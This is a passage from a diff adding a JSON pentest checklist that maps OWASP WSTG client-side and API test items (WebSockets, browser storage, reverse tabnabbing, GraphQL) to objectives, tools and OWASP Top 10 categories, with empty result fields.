+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CLNT-10 <br><br> </p>\n                <p><strong>Objectives:</strong> - Identify the usage of WebSockets by inspecting ws:// or wss:// URI scheme.<br>- Assess its implementation by using the same tests on normal HTTP channels. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A2<br>A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "61e5f971-21b5-4506-90c8-173178f743aa",
+              "title": "Testing Web Messaging",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CLNT-11 <br><br> </p>\n                <p><strong>Objectives:</strong> - Assess the security of the message's origin.<br>- Validate that it's using safe methods and validating its input. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A5<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "40fbe926-b5b1-4a98-a4c8-ae6771b3bada",
+              "title": "Testing Browser Storage",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CLNT-12 <br><br> </p>\n                <p><strong>Objectives:</strong> - Determine whether the website is storing sensitive data in client-side storage.<br>- The code handling of the storage objects should be examined for possibilities of injection attacks, such as utilizing unvalidated input or vulnerable libraries. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A1<br>A4<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "2a378bb8-9e80-4a95-83bf-cd017b5ea64c",
+              "title": "Testing for Cross Site Script Inclusion",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CLNT-13 <br><br> </p>\n                <p><strong>Objectives:</strong> - Locate sensitive data across the system.<br>- Assess the leakage of sensitive data through various techniques. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            },
+            {
+              "id": "8e9c3e8b-2bb4-4ad4-ab6d-303c0650f2c4",
+              "title": "Testing for Reverse Tabnabbing",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-CLNT-14 <br><br> </p>\n                <p><strong>Objectives:</strong> N/A <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            }
+          ]
+        },
+        {
+          "id": "a373ef8b-aa48-4196-bf65-d33d2aff6e6c",
+          "title": "12. API Testing",
+          "checklist": [
+            {
+              "id": "fb23f50e-50b2-4973-8253-13db2ec839f3",
+              "title": "Testing GraphQL",
+              "content": "<p><strong>WSTG-ID:</strong> WSTG-APIT-01 <br><br> </p>\n                <p><strong>Objectives:</strong> - Assess that a secure and production-ready configuration is deployed.<br>- Validate all input fields against generic attacks.<br>- Ensure that proper access controls are applied. <br> <br></p>\n                <p><strong>Tools:</strong> Burpsuite/ZAP<br>GraphSQL Raider <br><br> </p>\n                <p><strong>OWASP Top 10:</strong> A3<br><br></p>\n                <p><strong> Result :</strong> <br><br> </p>"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "templates": [],
+  "payloads": [],
+  "messages": {
+    "showDeleteConfirmation": true
+  }
+}
